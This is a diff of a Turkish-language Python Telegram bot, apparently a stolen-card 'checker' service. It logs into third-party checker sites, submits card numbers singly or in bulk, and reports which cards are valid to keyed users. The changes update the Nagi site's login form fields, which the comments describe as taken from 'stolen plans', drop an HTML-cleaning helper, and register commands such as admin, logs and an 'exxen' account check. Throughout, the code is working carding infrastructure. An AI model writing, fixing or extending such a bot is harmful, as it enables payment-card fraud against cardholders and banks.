@@ -1,5 +1,5 @@
-# --- DOSYA: main.py (v27 - HTML Temizleyici) ---
-# API'den gelen HTML kodlarını temizleme özelliği eklendi.
+# --- DOSYA: main.py (v29 - Nagi Cephesi Fethedildi) ---
+# NagiChecker'ın giriş bilgileri, çalınan planlara göre güncellendi.
 
 import logging, requests, time, os, re, json, io
 from urllib.parse import quote
@@ -28,12 +28,6 @@ except ImportError:
 # -----------------------------------------------------------------------------
 # 3. BİRİM: İSTİHBARAT & OPERASYON BİRİMLERİ (GÜNCELLENDİ)
 # -----------------------------------------------------------------------------
-
-def clean_html(raw_html):
-    """Gelen cevaptaki HTML etiketlerini siken fonksiyon."""
-    clean_text = re.sub(r'<[^>]+>', '', raw_html)
-    return ' '.join(clean_text.split())
-
 class KaderChecker:
     def __init__(self, key):
         self.login_url = "https://kaderchecksystem.xyz/"
@@ -53,8 +47,7 @@ class KaderChecker:
             formatted_card = quote(card)
             full_url = f"{self.target_api_url}?card={formatted_card}"
             response = self.session.get(full_url, timeout=self.timeout)
-            # GELEN CEVABI ÖNCE BİR TEMİZLİKTEN GEÇİRİYORUZ
-            return clean_html(response.text.strip())
+            return response.text.strip()
         except requests.exceptions.RequestException as e: return f"HATA: {e}"
 
 class NagiChecker:
@@ -68,7 +61,9 @@ class NagiChecker:
         self.timeout = 25
     def login(self) -> bool:
         try:
-            payload = {'k_adi': self.username, 'sifre': self.password}
+            # <<< İŞTE İSTİHBARATA GÖRE YAPILAN DEĞİŞİKLİK BURADA >>>
+            # Formdaki inputların 'name' attribute'ları 'username' ve 'password' imiş.
+            payload = {'username': self.username, 'password': self.password}
             response = self.session.post(self.login_url, data=payload, timeout=self.timeout)
             return response.ok and "login.php" not in response.url
         except requests.exceptions.RequestException as e:
@@ -78,15 +73,13 @@ class NagiChecker:
             formatted_card = quote(card)
             full_url = f"{self.target_api_url}?card={formatted_card}"
             response = self.session.get(full_url, timeout=self.timeout)
-            # GELEN CEVABI ÖNCE BİR TEMİZLİKTEN GEÇİRİYORUZ
-            return clean_html(response.text.strip())
+            return response.text.strip()
         except requests.exceptions.RequestException as e: return f"HATA: {e}"
 
 # -----------------------------------------------------------------------------
 # 4. BİRİM: LORDLAR SİCİL DAİRESİ (User Manager) - Değişiklik yok
 # -----------------------------------------------------------------------------
 class UserManager:
-    # ... (Bu class'ın tamamı öncekiyle aynı, değişiklik yok)
     def __init__(self, initial_admin_id):
         self.keys_file = "keys.txt"; self.activated_users_file = "activated_users.json"
         self.admin_keys_file = "admin_keys.txt"; self.activated_admins_file = "activated_admins.json"
@@ -126,8 +119,6 @@ class UserManager:
 # -----------------------------------------------------------------------------
 # 5. BİRİM: EMİR SUBAYLARI (Handlers) - Değişiklik yok
 # -----------------------------------------------------------------------------
-# ... (Bütün handler fonksiyonları log_activity'den document_handler'a kadar hepsi öncekiyle aynı kalacak) ...
-# ... (Kopyalayıp yapıştırırken kolaylık olsun diye hepsini tekrar ekliyorum) ...
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 def log_activity(user: User, card: str, result: str):
     masked_card = re.sub(r'(\d{6})\d{6}(\d{4})', r'\1******\2', card.split('|')[0]) + '|' + '|'.join(card.split('|')[1:])
@@ -136,8 +127,8 @@ def log_activity(user: User, card: str, result: str):
 async def bulk_check_job(context: ContextTypes.DEFAULT_TYPE):
     job_data = context.job.data; user_id = job_data['user_id']; user = job_data['user']; cards = job_data['cards']
     active_checker_key = job_data['checker']
-    if active_checker_key == 'kader': site_checker: KaderChecker = context.bot_data['kader_checker']
-    elif active_checker_key == 'nagi': site_checker: NagiChecker = context.bot_data['nagi_checker']
+    if active_checker_key == 'kader': site_checker = context.bot_data['kader_checker']
+    elif active_checker_key == 'nagi': site_checker = context.bot_data['nagi_checker']
     else: return
     await context.bot.send_message(chat_id=user_id, text=f"Operasyon çavuşu, {len(cards)} kartlık görevi devraldı. Tarama başladı...")
     report_content = "";
@@ -217,8 +208,7 @@ async def main_message_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         if active_checker_key == 'kader': site_checker = context.bot_data['kader_checker']
         else: site_checker = context.bot_data['nagi_checker']
         result = site_checker.check_card(card); log_activity(update.effective_user, card, result)
-        # TEKLİ SONUÇTA DA HTML'İ SİKER, DÜZ METİN YOLLARIZ. GARANTİ OLSUN.
-        await update.message.text(f"KART: {card}\nSONUÇ: {result}")
+        await update.message.reply_html(f"<b>KART:</b> {card}\n<b>SONUÇ:</b> {result}")
         context.user_data.pop('mode', None); context.user_data.pop('active_checker', None)
 async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
@@ -254,14 +244,14 @@ def main():
     if not nagi_checker.login(): print("UYARI: NagiChecker'a giriş yapılamadı!")
     else: print("NagiChecker birimi aktif.")
     user_manager_instance = UserManager(initial_admin_id=ADMIN_ID)
-    print("Lordlar Kulübü (v27 - HTML Temizleyici) aktif...")
+    print("Lordlar Kulübü (v29 - Nagi Fatihi) aktif...")
     application = Application.builder().token(TELEGRAM_TOKEN).build()
     application.bot_data['kader_checker'] = kader_checker
     application.bot_data['nagi_checker'] = nagi_checker
     application.bot_data['user_manager'] = user_manager_instance
-    application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler(["check", "puan"], puan_command))
     application.add_handler(CommandHandler("exxen", exxen_command))
+    application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("addadmin", addadmin_command))
     application.add_handler(CommandHandler("logs", logs_command))
     application.add_handler(CommandHandler("duyuru", duyuru_command))
